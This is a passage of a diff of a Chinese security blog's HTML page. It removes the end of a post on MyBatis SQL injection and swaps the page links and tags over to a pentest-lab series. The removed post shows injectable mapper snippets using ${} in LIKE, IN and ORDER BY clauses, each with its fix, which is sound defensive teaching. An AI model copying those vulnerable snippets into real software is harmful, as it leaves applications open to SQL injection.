-&lt;&#x2F;select&gt;</code></pre>
-
-<p>修复的写法是使用 <code>concat</code> 连接</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;select id&#x3D;&quot;getUsersByIds&quot; resultType&#x3D;&quot;User&quot;&gt;
-	select * from users where username like concat(&#39;%&#39;,#&#123;username&#125;,&#39;%&#39;) 
-&lt;&#x2F;select&gt;</code></pre>
-
-<p>‍</p>
-<h3 id="动态多条件查询"><a href="#动态多条件查询" class="headerlink" title="动态多条件查询"></a>动态多条件查询</h3><p>查询多个 ID 时，可能会将一个用逗号分割的字符串传给 SQL，这里使用 in 语句，如果使用 <code>#{}</code>，由于预编译机制，会导致将输入的当作一个字符串，不能满足需求，修改为了</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;select id&#x3D;&quot;getUsersByIds&quot; resultType&#x3D;&quot;User&quot;&gt;
-	select * from users where username in ($&#123;ID&#125;)
-&lt;&#x2F;select&gt;</code></pre>
-
-<p>修复的写法是将传来的字符在 java 层转化为 <code>List</code>​ 或 <code>Array</code>​，使用 Mybatis 的 <code>&lt;foreach&gt;</code> 标签</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;select id&#x3D;&quot;getUsersByIds&quot; resultType&#x3D;&quot;User&quot;&gt;
-    SELECT * FROM users WHERE id IN
-    &lt;foreach collection&#x3D;&quot;idList&quot; item&#x3D;&quot;id&quot; open&#x3D;&quot;(&quot; separator&#x3D;&quot;,&quot; close&#x3D;&quot;)&quot;&gt;
-        #&#123;id&#125;
-    &lt;&#x2F;foreach&gt;
-&lt;&#x2F;select&gt;</code></pre>
-
-<p>‍</p>
-<h3 id="动态排序"><a href="#动态排序" class="headerlink" title="动态排序"></a>动态排序</h3><p>动态排序功能，需要在 <code>order by</code> 后面传入参数，这里的参数是列名，JDBC 的规定，表名和列名是不能预编译的</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;select id&#x3D;&quot;getUsersSorted&quot; resultType&#x3D;&quot;User&quot;&gt;
-    SELECT * FROM users ORDER BY $&#123;column&#125; limit 0,1
-&lt;&#x2F;select&gt;</code></pre>
-
-<p>这里必须使用字符串拼接，所以 SQL 无法修改，需要在 Java 业务层添加白名单校验</p>
 
                 
             </div>
@@ -418,7 +647,7 @@ Mybatis 的使用有几个部分
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2025/12/13/mybatis-zhu-ru/">https://wwwmarin.xyz/2025/12/13/mybatis-zhu-ru/</a>
+                    <a href="https://wwwmarin.xyz/2026/03/23/hong-ri-ba-chang-3/">https://wwwmarin.xyz/2026/03/23/hong-ri-ba-chang-3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -456,16 +685,12 @@ Mybatis 的使用有几个部分
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web/">
-                                    <span class="chip bg-color">web</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
                                 </a>
                             
-                                <a href="/tags/java/">
-                                    <span class="chip bg-color">java</span>
-                                </a>
-                            
-                                <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL 注入</span>
+                                <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                                    <span class="chip bg-color">红日靶场系列</span>
                                 </a>
                             
                         </div>
@@ -544,16 +769,17 @@ Mybatis 的使用有几个部分
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2026/03/17/hong-ri-ba-chang-1/">
+                <a href="/2026/03/23/hong-ri-ba-chang-3/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/76dty8y5jpmit0o32n6a4dpr3.jpg" class="responsive-img" alt="红日靶场 1">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20230618_234051.jpg" class="responsive-img" alt="红日靶场 3">
                         
-                        <span class="card-title">红日靶场 1</span>
+                        <span class="card-title">红日靶场 3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -563,9 +789,9 @@ Mybatis 的使用有几个部分
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-03-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -578,6 +804,7 @@ Mybatis 的使用有几个部分
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -600,12 +827,12 @@ Mybatis 的使用有几个部分
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/12/08/redis/">
+                <a href="/2026/03/20/hong-ri-ba-chang-2/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/c3170526bdf37df281b1180d3a76367f.png" class="responsive-img" alt="Redis">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%ED%82%A4%ED%83%80%EA%B0%80%EC%99%80%20%EB%A7%88%EB%A6%B0_97880017.png" class="responsive-img" alt="红日靶场 2">
                         
-                        <span class="card-title">Redis</span>
+                        <span class="card-title">红日靶场 2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -616,14 +843,14 @@ Mybatis 的使用有几个部分
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/WEB/" class="post-category">
-                                    WEB
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
@@ -633,12 +860,12 @@ Mybatis 的使用有几个部分
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                        <span class="chip bg-color">红日靶场系列</span>
                     </a>
                     
                 </div>
